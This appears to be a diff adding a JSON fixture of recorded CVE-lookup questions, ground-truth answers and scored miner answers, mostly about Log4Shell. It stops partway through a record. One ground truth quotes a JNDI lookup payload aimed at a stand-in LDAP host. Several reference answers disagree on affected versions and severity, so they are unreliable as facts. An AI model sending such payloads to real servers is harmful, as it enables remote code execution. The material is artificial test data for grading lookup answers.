@@ -1,0 +1,515 @@
+{
+  "intent": "CVE_LOOKUP",
+  "class": "REAL",
+  "provenance": {
+    "source": "scores-api",
+    "url": "https://devnode.telegraphprotocol.com/scores?intent=CVE_LOOKUP&limit=300",
+    "captured": "2026-08-27T08:05:39.131Z",
+    "rows_returned": 51,
+    "rows_available": 51,
+    "epoch_min": 260,
+    "epoch_max": 285,
+    "scored_text_field": "converted_answer",
+    "selection": "top 15 (question, ground_truth) groups by distinct scored answers",
+    "empty_converted_answers": 38,
+    "empty_converted_answer_share": 0.7451,
+    "empty_converted_answer_max_live_score": 0,
+    "ground_truth_refusal_shaped": 0
+  },
+  "fixtures": [
+    {
+      "id": "cve_lookup-real-01",
+      "intent": "CVE_LOOKUP",
+      "class": "REAL",
+      "rationale": "recorded traffic: verifies the harness on the answers the node actually scored",
+      "question": "Can you provide the severity rating and affected versions for CVE-2021-44228?",
+      "ground_truth": "CVE-2021-44228, also known as Log4Shell, is rated as Critical with a CVSS score of 10. It affects Apache Log4j versions from 2.0-beta9 to 2.14.1 . \n\nThe vulnerability allows remote attackers to execute arbitrary code via JNDI LDAP endpoints when message lookup substitution is enabled . \n\nAffected versions include all Apache Log4j 2.x versions up to 2.14.1 if message lookup substitution was enabled . The fixed versions are Apache Log4j 2.15.0 and later .",
+      "answers": [
+        {
+          "id": "real-patchsignal-cve-e285",
+          "text": "The data shows a critical vulnerability (CVE-2021-44228) in Apache Log4j2, which allows remote code execution through unsafe JNDI lookup handling. It affects versions 2.0-beta9 to 2.3.1, 2.4 to 2.12.2, and 2.13.0 to 2.15.0, with confirmed exploitation in the wild and a known exploitation date of December 10, 2021.",
+          "quality": null,
+          "note": "recorded answer; live score is metadata, not truth",
+          "meta": {
+            "record_id": "7d72c8c5-c8a8-4e2c-a03f-a7ce685037c1",
+            "miner_slug": "patchsignal-cve",
+            "epoch_id": 285,
+            "live_score": 2.1280314e-22,
+            "live_rank": 1,
+            "scored_at": "2026-08-27T00:37:22.443936Z",
+            "failure_reason": "",
+            "looks_like_refusal": false,
+            "raw_miner_answer": "{\"cve_id\":\"CVE-2021-44228\",\"cvss_score\":10,\"cwe\":[\"CWE-20\",\"CWE-400\",\"CWE-502\",\"CWE-917\"],\"description\":\"CVE-2021-44228. Severity: CRITICAL. CVSS base score: 10.0. Earliest affected version: 2.0-beta9. Affected version ranges: Apache Software Foundation Apache Log4j2 \\u003e= 2.0-beta9 and \\u003c 2.3.1; Apache Software Foundation Apache Log4j2 \\u003e= 2.4 and \\u003c 2.12.2; Apache Software Foundation Apache Log4j2 \\u003e= 2.13.0 and \\u003c 2.15.0. Impact/details: can allow remote/arbitrary code execution; exploitation involves unsafe JNDI lookup handling. Fixed or unaffected boundaries: Apache Software Foundation Apache Log4j2 2.3.1 or later on that branch; Apache Software Foundation Apache Log4j2 2.12.2 or later on that branch; Apache Software Foundation Apache Log4j2 2.15.0 or later on that branch. Known exploitation: confirmed exploitation in the wild; listed in CISA KEV since 2021-12-10.\",\"last_modified\":\"2026-08-11T19:33:44.513\",\"published\":\"2021-12-10T10:15:09.143\",\"references\":[\"http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html\",\"http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html\",\"http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html\"],\"severity\":\"CRITICAL\",\"source\":\"NVD + CVE.org\",\"vector\":\"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}"
+          }
+        }
+      ],
+      "pairs": [],
+      "constraints": [],
+      "provenance": {
+        "source": "scores-api",
+        "url": "https://devnode.telegraphprotocol.com/scores?intent=CVE_LOOKUP&limit=300",
+        "epoch_min": 285,
+        "epoch_max": 285,
+        "captured": "2026-08-27T08:05:39.131Z",
+        "distinct_answers": 1,
+        "ground_truth_looks_like_refusal": false
+      }
+    },
+    {
+      "id": "cve_lookup-real-02",
+      "intent": "CVE_LOOKUP",
+      "class": "REAL",
+      "rationale": "recorded traffic: verifies the harness on the answers the node actually scored",
+      "question": "Can you provide the severity and affected versions for CVE-2026-34612?",
+      "ground_truth": "CVE-2026-34612 is a SQL injection vulnerability in Kestra, an open-source orchestration engine. The severity is critical with a CVSS score of 8.8, and the affected version is before 1.3.7.",
+      "answers": [
+        {
+          "id": "real-patchsignal-cve-e284",
+          "text": "This data describes a critical vulnerability (CVE-2026-34612) in the kestra-io project, with a CVSS score of 9.9, affecting versions up to 1.3.7. It allows remote code execution and SQL injection, and has public exploits available.",
+          "quality": null,
+          "note": "recorded answer; live score is metadata, not truth",
+          "meta": {
+            "record_id": "050eb25a-b616-4d23-ac09-3684f908413e",
+            "miner_slug": "patchsignal-cve",
+            "epoch_id": 284,
+            "live_score": 0.012592356,
+            "live_rank": 1,
+            "scored_at": "2026-08-26T15:41:16.470749Z",
+            "failure_reason": "",
+            "looks_like_refusal": false,
+            "raw_miner_answer": "{\"cve_id\":\"CVE-2026-34612\",\"cvss_score\":9.9,\"cwe\":[\"CWE-89\"],\"description\":\"CVE-2026-34612. Severity: CRITICAL. CVSS base score: 9.9. Earliest affected version: 1.3.7. Affected version ranges: kestra-io kestra \\u003c 1.3.7. Impact/details: can allow remote/arbitrary code execution; SQL injection vulnerability. Known exploits: public exploit or proof-of-concept references are available.\",\"last_modified\":\"2026-07-24T22:10:00.140\",\"published\":\"2026-04-03T23:17:04.587\",\"references\":[\"https://github.com/kestra-io/kestra/commit/3926762795df8ad3e03924b370c51832ed3a21d3\",\"https://github.com/kestra-io/kestra/releases/tag/v1.3.7\",\"https://github.com/kestra-io/kestra/security/advisories/GHSA-365w-2m69-mp9x\"],\"severity\":\"CRITICAL\",\"source\":\"NVD + CVE.org\",\"vector\":\"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H\"}"
+          }
+        }
+      ],
+      "pairs": [],
+      "constraints": [],
+      "provenance": {
+        "source": "scores-api",
+        "url": "https://devnode.telegraphprotocol.com/scores?intent=CVE_LOOKUP&limit=300",
+        "epoch_min": 284,
+        "epoch_max": 284,
+        "captured": "2026-08-27T08:05:39.131Z",
+        "distinct_answers": 1,
+        "ground_truth_looks_like_refusal": false
+      }
+    },
+    {
+      "id": "cve_lookup-real-03",
+      "intent": "CVE_LOOKUP",
+      "class": "REAL",
+      "rationale": "recorded traffic: verifies the harness on the answers the node actually scored",
+      "question": "Can you retrieve the severity, affected versions, and any known exploits for CVE-2021-44228?",
+      "ground_truth": "- **Severity**: CVE-2021-44228, also known as Log4Shell, is rated as critical with a CVSS score of 10, the highest possible score, indicating a severe remote code execution vulnerability that allows unauthenticated attackers to take full control of affected systems .\n  \n- **Affected Versions**: The vulnerability affects Apache Log4j versions from 2.0-beta9 to 2.14.1 . It does not affect versions before 2.0 or after 2.15.0 .\n  \n- **Known Exploits**: This vulnerability has been actively exploited in the wild since its disclosure. Attackers can exploit it by sending a specially crafted request containing a malicious string (e.g., `${jndi:ldap://example.com/a}`) to a vulnerable system, allowing them to execute arbitrary code, leading to full system compromise . There have been widespread scanning activities and exploit attempts targeting unpatched systems .",
+      "answers": [
+        {
+          "id": "real-patchsignal-cve-e283",
+          "text": "This data describes a critical vulnerability (CVE-2021-44228) in Apache Log4j2, which allows remote code execution through unsafe JNDI lookup handling. It affects versions 2.0-beta9 to 2.3.1, 2.4 to 2.12.2, and 2.13.0 to 2.15.0, with confirmed exploitation in the wild and a CVSS score of 10.0.",
+          "quality": null,
+          "note": "recorded answer; live score is metadata, not truth",
+          "meta": {
+            "record_id": "5c66cf82-b29a-49e1-8f8b-f570dc4d140b",
+            "miner_slug": "patchsignal-cve",
+            "epoch_id": 283,
+            "live_score": 0.010543638,
+            "live_rank": 1,
+            "scored_at": "2026-08-26T13:13:45.149647Z",
+            "failure_reason": "",
+            "looks_like_refusal": false,
+            "raw_miner_answer": "{\"cve_id\":\"CVE-2021-44228\",\"cvss_score\":10,\"cwe\":[\"CWE-20\",\"CWE-400\",\"CWE-502\",\"CWE-917\"],\"description\":\"CVE-2021-44228. Severity: CRITICAL. CVSS base score: 10.0. Earliest affected version: 2.0-beta9. Affected version ranges: Apache Software Foundation Apache Log4j2 \\u003e= 2.0-beta9 and \\u003c 2.3.1; Apache Software Foundation Apache Log4j2 \\u003e= 2.4 and \\u003c 2.12.2; Apache Software Foundation Apache Log4j2 \\u003e= 2.13.0 and \\u003c 2.15.0. Impact/details: can allow remote/arbitrary code execution; exploitation involves unsafe JNDI lookup handling. Fixed or unaffected boundaries: Apache Software Foundation Apache Log4j2 2.3.1 or later on that branch; Apache Software Foundation Apache Log4j2 2.12.2 or later on that branch; Apache Software Foundation Apache Log4j2 2.15.0 or later on that branch. Known exploitation: confirmed exploitation in the wild; listed in CISA KEV since 2021-12-10.\",\"last_modified\":\"2026-08-11T19:33:44.513\",\"published\":\"2021-12-10T10:15:09.143\",\"references\":[\"http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html\",\"http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html\",\"http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html\"],\"severity\":\"CRITICAL\",\"source\":\"NVD + CVE.org\",\"vector\":\"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}"
+          }
+        }
+      ],
+      "pairs": [],
+      "constraints": [],
+      "provenance": {
+        "source": "scores-api",
+        "url": "https://devnode.telegraphprotocol.com/scores?intent=CVE_LOOKUP&limit=300",
+        "epoch_min": 283,
+        "epoch_max": 283,
+        "captured": "2026-08-27T08:05:39.131Z",
+        "distinct_answers": 1,
+        "ground_truth_looks_like_refusal": false
+      }
+    },
+    {
+      "id": "cve_lookup-real-04",
+      "intent": "CVE_LOOKUP",
+      "class": "REAL",
+      "rationale": "recorded traffic: verifies the harness on the answers the node actually scored",
+      "question": "Can you retrieve the full details, severity, and affected versions for CVE-2021-44228 using your data sources?",
+      "ground_truth": "- **CVE-2021-44228**, also known as Log4Shell, is a critical remote code execution (RCE) vulnerability in Apache Log4j versions 2.0-beta9 to 2.14.1 . \n- **Severity**: It carries a CVSS score of 10, the highest possible, indicating a critical impact with high confidentiality, integrity, and availability consequences . \n- **Affected Versions**: All Apache Log4j 2.x versions up to and including 2.14.1 are vulnerable if message lookup substitution was enabled . \n- The vulnerability allows unauthenticated attackers to execute arbitrary code on affected systems by manipulating log messages with specially crafted input containing JNDI LDAP endpoints . \n- **Mitigation**: Immediate upgrade to Log4j version 2.17.1 or application of the `log4j2.formatMsgNoLookups` system property to “true” is recommended .",
+      "answers": [
+        {
+          "id": "real-patchsignal-cve-e282",
+          "text": "This data describes a critical vulnerability (CVE-2021-44228) in Apache Log4j2, which allows remote code execution through unsafe JNDI lookup handling. It affects versions 2.0-beta9 to 2.3.1, 2.4 to 2.12.2, and 2.13.0 to 2.15.0, with confirmed exploitation in the wild and a CVSS score of 10.0.",
+          "quality": null,
+          "note": "recorded answer; live score is metadata, not truth",
+          "meta": {
+            "record_id": "6a32bf5a-16cd-4673-a1f4-e45c95b23fc7",
+            "miner_slug": "patchsignal-cve",
+            "epoch_id": 282,
+            "live_score": 0.009420923,
+            "live_rank": 1,
+            "scored_at": "2026-08-26T12:29:12.734019Z",
+            "failure_reason": "",
+            "looks_like_refusal": false,
+            "raw_miner_answer": "{\"cve_id\":\"CVE-2021-44228\",\"cvss_score\":10,\"cwe\":[\"CWE-20\",\"CWE-400\",\"CWE-502\",\"CWE-917\"],\"description\":\"CVE-2021-44228. Severity: CRITICAL. CVSS base score: 10.0. Earliest affected version: 2.0-beta9. Affected version ranges: Apache Software Foundation Apache Log4j2 \\u003e= 2.0-beta9 and \\u003c 2.3.1; Apache Software Foundation Apache Log4j2 \\u003e= 2.4 and \\u003c 2.12.2; Apache Software Foundation Apache Log4j2 \\u003e= 2.13.0 and \\u003c 2.15.0. Impact/details: can allow remote/arbitrary code execution; exploitation involves unsafe JNDI lookup handling. Fixed or unaffected boundaries: Apache Software Foundation Apache Log4j2 2.3.1 or later on that branch; Apache Software Foundation Apache Log4j2 2.12.2 or later on that branch; Apache Software Foundation Apache Log4j2 2.15.0 or later on that branch. Known exploitation: confirmed exploitation in the wild; listed in CISA KEV since 2021-12-10.\",\"last_modified\":\"2026-08-11T19:33:44.513\",\"published\":\"2021-12-10T10:15:09.143\",\"references\":[\"http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html\",\"http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html\",\"http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html\"],\"severity\":\"CRITICAL\",\"source\":\"NVD + CVE.org\",\"vector\":\"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}"
+          }
+        }
+      ],
+      "pairs": [],
+      "constraints": [],
+      "provenance": {
+        "source": "scores-api",
+        "url": "https://devnode.telegraphprotocol.com/scores?intent=CVE_LOOKUP&limit=300",
+        "epoch_min": 282,
+        "epoch_max": 282,
+        "captured": "2026-08-27T08:05:39.131Z",
+        "distinct_answers": 1,
+        "ground_truth_looks_like_refusal": false
+      }
+    },
+    {
+      "id": "cve_lookup-real-05",
+      "intent": "CVE_LOOKUP",
+      "class": "REAL",
+      "rationale": "recorded traffic: verifies the harness on the answers the node actually scored",
+      "question": "What is the severity and affected versions of CVE-2021-44228?",
+      "ground_truth": "The CVE-2021-44228, also known as Log4Shell, is a critical remote code execution (RCE) vulnerability in Apache Log4j versions 2.0-beta9 to 2.14.1 . \n\nThe severity of this vulnerability is **Critical** with a CVSS score of **10** . \n\nAffected versions are Apache Log4j 2.x versions up to 2.14.1 . \n\nThis vulnerability allows a remote, unauthenticated attacker to take full control of a vulnerable target system by exploiting the way specially crafted log messages were handled by the Log4j processor .",
+      "answers": [
+        {
+          "id": "real-patchsignal-cve-e279",
+          "text": "The data describes a critical vulnerability (CVE-2021-44228) in Apache Log4j2 versions between 2.0-beta9 and 2.15.0, with a CVSS score of 10, allowing remote arbitrary code execution due to unsafe JNDI lookup handling. The vulnerability has been confirmed exploited in the wild and was addressed in versions 2.3.1, 2.12.2, and 2.15.0 or later.",
+          "quality": null,
+          "note": "recorded answer; live score is metadata, not truth",
+          "meta": {
+            "record_id": "7b121d48-1f87-49b9-8b20-5293735e1c2a",
+            "miner_slug": "patchsignal-cve",
+            "epoch_id": 279,
+            "live_score": 0.010779246,
+            "live_rank": 1,
+            "scored_at": "2026-08-26T08:22:05.767714Z",
+            "failure_reason": "",
+            "looks_like_refusal": false,
+            "raw_miner_answer": "{\"cve_id\":\"CVE-2021-44228\",\"cvss_score\":10,\"cwe\":[\"CWE-20\",\"CWE-400\",\"CWE-502\",\"CWE-917\"],\"description\":\"CVE-2021-44228. Severity: CRITICAL. CVSS base score: 10.0. Earliest affected version: 2.0-beta9. Affected version ranges: Apache Software Foundation Apache Log4j2 \\u003e= 2.0-beta9 and \\u003c 2.3.1; Apache Software Foundation Apache Log4j2 \\u003e= 2.4 and \\u003c 2.12.2; Apache Software Foundation Apache Log4j2 \\u003e= 2.13.0 and \\u003c 2.15.0. Impact/details: can allow remote/arbitrary code execution; exploitation involves unsafe JNDI lookup handling. Fixed or unaffected boundaries: Apache Software Foundation Apache Log4j2 2.3.1 or later on that branch; Apache Software Foundation Apache Log4j2 2.12.2 or later on that branch; Apache Software Foundation Apache Log4j2 2.15.0 or later on that branch. Known exploitation: confirmed exploitation in the wild; listed in CISA KEV since 2021-12-10.\",\"last_modified\":\"2026-08-11T19:33:44.513\",\"published\":\"2021-12-10T10:15:09.143\",\"references\":[\"http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html\",\"http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html\",\"http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html\"],\"severity\":\"CRITICAL\",\"source\":\"NVD + CVE.org\",\"vector\":\"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}"
+          }
+        }
+      ],
+      "pairs": [],
+      "constraints": [],
+      "provenance": {
+        "source": "scores-api",
+        "url": "https://devnode.telegraphprotocol.com/scores?intent=CVE_LOOKUP&limit=300",
+        "epoch_min": 279,
+        "epoch_max": 279,
+        "captured": "2026-08-27T08:05:39.131Z",
+        "distinct_answers": 1,
+        "ground_truth_looks_like_refusal": false
+      }
+    },
+    {
+      "id": "cve_lookup-real-06",
+      "intent": "CVE_LOOKUP",
+      "class": "REAL",
+      "rationale": "recorded traffic: verifies the harness on the answers the node actually scored",
+      "question": "Can you retrieve the full details, severity scores, and affected versions for CVE-2021-44228?",
+      "ground_truth": "The **CVE-2021-44228**, also known as **Log4Shell**, is a critical remote code execution (RCE) vulnerability in **Apache Log4j versions 2.x up to 2.14.1**. \n\n### **Severity Score**\n- **CVSS Score**: **10** (Critical). \n\n### **Affected Versions**\n- **Apache Log4j**: Versions **2.0 to 2.14.1** are affected. \n- **Products using Log4j**: Many Java-based applications and frameworks that use Log4j 2.x up to 2.14.1 are impacted, including but not limited to:\n  - **IBM SPSS Statistics** - **Apache Struts 2**- **Elasticsearch** components in Red Hat OpenShift Logging- **Versa Director, Versa Analytics, and Concerto**### **Details**\n- **Vulnerability Type**: Remote Code Execution (RCE). \n- **Exploitation**: An attacker can execute arbitrary code on a vulnerable system by sending a specially crafted log message containing a JNDI LDAP endpoint. \n- **Impact**: Successful exploitation allows an attacker to take full control of the affected system. \n\n### **Mitigation**\n- **Upgrade**: Upgrade to **Apache Log4j version 2.15.0 or later**. \n- **Mitigation for older versions**:\n  - Set the system property `log4j2.formatMsgNoLookups` to `true`. \n  - Or remove the `JndiLookup` class from the classpath. \n\nThis vulnerability was widely exploited in the wild, making immediate patching crucial.",
+      "answers": [
+        {
+          "id": "real-patchsignal-cve-e275",
+          "text": "The data describes a critical security vulnerability (CVE-2021-44228) in Apache Log4j2 with a CVSS score of 10, detailing affected versions, impact, and references to external resources for further information.",
+          "quality": null,
+          "note": "recorded answer; live score is metadata, not truth",
+          "meta": {
+            "record_id": "9ce7c22c-5ff7-43bd-849c-6b3d24a04aad",
+            "miner_slug": "patchsignal-cve",
+            "epoch_id": 275,
+            "live_score": 0.011429346,
+            "live_rank": 1,
+            "scored_at": "2026-08-25T11:43:49.841138Z",
+            "failure_reason": "",
+            "looks_like_refusal": false,
+            "raw_miner_answer": "{\"cve_id\":\"CVE-2021-44228\",\"cvss_score\":10,\"cwe\":[\"CWE-20\",\"CWE-400\",\"CWE-502\",\"CWE-917\"],\"description\":\"CVE-2021-44228. Severity: CRITICAL. CVSS base score: 10.0. Earliest affected version: 2.0-beta9. Affected version ranges: Apache Software Foundation Apache Log4j2 \\u003e= 2.0-beta9 and \\u003c 2.3.1; Apache Software Foundation Apache Log4j2 \\u003e= 2.4 and \\u003c 2.12.2; Apache Software Foundation Apache Log4j2 \\u003e= 2.13.0 and \\u003c 2.15.0. Impact/details: can allow remote/arbitrary code execution; exploitation involves unsafe JNDI lookup handling. Fixed or unaffected boundaries: Apache Software Foundation Apache Log4j2 2.3.1 or later on that branch; Apache Software Foundation Apache Log4j2 2.12.2 or later on that branch; Apache Software Foundation Apache Log4j2 2.15.0 or later on that branch. Known exploitation: confirmed exploitation in the wild; listed in CISA KEV since 2021-12-10.\",\"last_modified\":\"2026-08-11T19:33:44.513\",\"published\":\"2021-12-10T10:15:09.143\",\"references\":[\"http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html\",\"http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html\",\"http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html\"],\"severity\":\"CRITICAL\",\"source\":\"NVD + CVE.org\",\"vector\":\"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}"
+          }
+        }
+      ],
+      "pairs": [],
+      "constraints": [],
+      "provenance": {
+        "source": "scores-api",
+        "url": "https://devnode.telegraphprotocol.com/scores?intent=CVE_LOOKUP&limit=300",
+        "epoch_min": 275,
+        "epoch_max": 275,
+        "captured": "2026-08-27T08:05:39.131Z",
+        "distinct_answers": 1,
+        "ground_truth_looks_like_refusal": false
+      }
+    },
+    {
+      "id": "cve_lookup-real-07",
+      "intent": "CVE_LOOKUP",
+      "class": "REAL",
+      "rationale": "recorded traffic: verifies the harness on the answers the node actually scored",
+      "question": "What is the CVSS score and affected versions for CVE-2021-44228?",
+      "ground_truth": "The CVSS score for CVE-2021-44228 is **10**, indicating a critical severity level.\n\nAffected versions include Apache Log4j versions up to **2.14.1**.",
+      "answers": [
+        {
+          "id": "real-patchsignal-cve-e271",
+          "text": "The data describes a critical security vulnerability (CVE-2021-44228) in Apache Log4j2 with a CVSS score of 10, detailing multiple affected version ranges, the potential for remote code execution, and providing references for further information.",
+          "quality": null,
+          "note": "recorded answer; live score is metadata, not truth",
+          "meta": {
+            "record_id": "ff5418d4-a3f5-4842-9b86-f4ccec4b434d",
+            "miner_slug": "patchsignal-cve",
+            "epoch_id": 271,
+            "live_score": 0.76789767,
+            "live_rank": 1,
+            "scored_at": "2026-08-24T08:16:34.810916Z",
+            "failure_reason": "",
+            "looks_like_refusal": false,
+            "raw_miner_answer": "{\"cve_id\":\"CVE-2021-44228\",\"cvss_score\":10,\"cwe\":[\"CWE-20\",\"CWE-400\",\"CWE-502\",\"CWE-917\"],\"description\":\"CVE-2021-44228. Severity: CRITICAL. CVSS base score: 10.0. Earliest affected version: 2.0-beta9. Affected version ranges: Apache Software Foundation Apache Log4j2 \\u003e= 2.0-beta9 and \\u003c 2.3.1; Apache Software Foundation Apache Log4j2 \\u003e= 2.4 and \\u003c 2.12.2; Apache Software Foundation Apache Log4j2 \\u003e= 2.13.0 and \\u003c 2.15.0. Impact/details: can allow remote/arbitrary code execution; exploitation involves unsafe JNDI lookup handling. Fixed or unaffected boundaries: Apache Software Foundation Apache Log4j2 2.3.1 or later on that branch; Apache Software Foundation Apache Log4j2 2.12.2 or later on that branch; Apache Software Foundation Apache Log4j2 2.15.0 or later on that branch. Known exploitation: confirmed exploitation in the wild; listed in CISA KEV since 2021-12-10.\",\"last_modified\":\"2026-08-11T19:33:44.513\",\"published\":\"2021-12-10T10:15:09.143\",\"references\":[\"http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html\",\"http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html\",\"http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html\"],\"severity\":\"CRITICAL\",\"source\":\"NVD + CVE.org\",\"vector\":\"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}"
+          }
+        }
+      ],
+      "pairs": [],
+      "constraints": [],
+      "provenance": {
+        "source": "scores-api",
+        "url": "https://devnode.telegraphprotocol.com/scores?intent=CVE_LOOKUP&limit=300",
+        "epoch_min": 271,
+        "epoch_max": 271,
+        "captured": "2026-08-27T08:05:39.131Z",
+        "distinct_answers": 1,
+        "ground_truth_looks_like_refusal": false
+      }
+    },
+    {
+      "id": "cve_lookup-real-08",
+      "intent": "CVE_LOOKUP",
+      "class": "REAL",
+      "rationale": "recorded traffic: verifies the harness on the answers the node actually scored",
+      "question": "Can you retrieve the full details, severity, and affected versions for CVE-2021-44228?",
+      "ground_truth": "The **CVE-2021-44228**, also known as Log4Shell, is a critical remote code execution (RCE) vulnerability in Apache Log4j versions 2.0-beta9 to 2.14.1 . \n\nIt allows an attacker who can control log messages or log message parameters to execute arbitrary code on a server via JNDI LDAP endpoints when message lookup substitution is enabled .\n\n**Severity**: \nThe vulnerability is rated **Critical** with a CVSS score of **10** .\n\n**Affected Versions**: \nAll Apache Log4j 2.x versions up to **2.14.1** are affected . Specifically, versions from **2.0-beta9 to 2.14.1** are vulnerable .\n\n**Mitigation**: \nUsers should upgrade to Log4j **2.17.1** for Java 8 or **2.12.4** for Java 7 . Alternatively, mitigation can be achieved by setting the system property `log4j2.formatMsgNoLookups` to `true` or by removing the `JndiLookup` class from the classpath .",
+      "answers": [
+        {
+          "id": "real-patchsignal-cve-e269",
+          "text": "The data describes a critical security vulnerability (CVE-2021-44228) in Apache Log4j2 with a CVSS score of 10, detailing affected versions, impact, and references to external advisories and exploits.",
+          "quality": null,
+          "note": "recorded answer; live score is metadata, not truth",
+          "meta": {
+            "record_id": "b5501b3a-1c7a-4ee3-8287-9b61931f88d7",
+            "miner_slug": "patchsignal-cve",
+            "epoch_id": 269,
+            "live_score": 0.0011214928,
+            "live_rank": 1,
+            "scored_at": "2026-08-23T15:57:00.057124Z",
+            "failure_reason": "",
+            "looks_like_refusal": false,
+            "raw_miner_answer": "{\"cve_id\":\"CVE-2021-44228\",\"cvss_score\":10,\"cwe\":[\"CWE-20\",\"CWE-400\",\"CWE-502\",\"CWE-917\"],\"description\":\"CVE-2021-44228. Severity: CRITICAL. CVSS base score: 10.0. Earliest affected version: 2.0-beta9. Affected version ranges: Apache Software Foundation Apache Log4j2 \\u003e= 2.0-beta9 and \\u003c 2.3.1; Apache Software Foundation Apache Log4j2 \\u003e= 2.4 and \\u003c 2.12.2; Apache Software Foundation Apache Log4j2 \\u003e= 2.13.0 and \\u003c 2.15.0. Impact/details: can allow remote/arbitrary code execution; exploitation involves unsafe JNDI lookup handling. Fixed or unaffected boundaries: Apache Software Foundation Apache Log4j2 2.3.1 or later on that branch; Apache Software Foundation Apache Log4j2 2.12.2 or later on that branch; Apache Software Foundation Apache Log4j2 2.15.0 or later on that branch. Known exploitation: confirmed exploitation in the wild; listed in CISA KEV since 2021-12-10.\",\"last_modified\":\"2026-08-11T19:33:44.513\",\"published\":\"2021-12-10T10:15:09.143\",\"references\":[\"http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html\",\"http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html\",\"http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html\",\"http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html\"],\"severity\":\"CRITICAL\",\"source\":\"NVD + CVE.org\",\"vector\":\"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}"
+          }
+        }
+      ],
+      "pairs": [],
+      "constraints": [],
+      "provenance": {
+        "source": "scores-api",
+        "url": "https://devnode.telegraphprotocol.com/scores?intent=CVE_LOOKUP&limit=300",
+        "epoch_min": 269,
+        "epoch_max": 269,
+        "captured": "2026-08-27T08:05:39.131Z",
+        "distinct_answers": 1,
+        "ground_truth_looks_like_refusal": false
+      }
+    },
+    {
+      "id": "cve_lookup-real-09",
+      "intent": "CVE_LOOKUP",
+      "class": "REAL",
+      "rationale": "recorded traffic: verifies the harness on the answers the node actually scored",
+      "question": "What is the severity rating and the earliest affected version for CVE-2021-44228?",
+      "ground_truth": "The severity rating for CVE-2021-44228 is critical with a CVSS score of 10.0, and the earliest affected version is 2.0-beta9.\n\nThis vulnerability, also known as Log4Shell, allows for remote code execution due to improper handling of JNDI lookups in Log4j versions from 2.0-beta9 through 2.14.1.",
+      "answers": [
+        {
+          "id": "real-patchsignal-cve-e266",
+          "text": "The data describes a critical security vulnerability (CVE-2021-44228) in Apache Log4j2, affecting versions from 2.0-beta9 to 2.15.0 (excluding specific security releases), allowing remote code execution, with confirmed exploitation in the wild.",
+          "quality": null,
+          "note": "recorded answer; live score is metadata, not truth",
+          "meta": {
+            "record_id": "92a37217-e0d7-4950-9ea9-935fd5b1630f",
+            "miner_slug": "patchsignal-cve",
+            "epoch_id": 266,
+            "live_score": 0.0006604967,
+            "live_rank": 1,
+            "scored_at": "2026-08-22T18:45:50.530062Z",
+            "failure_reason": "",
+            "looks_like_refusal": false,
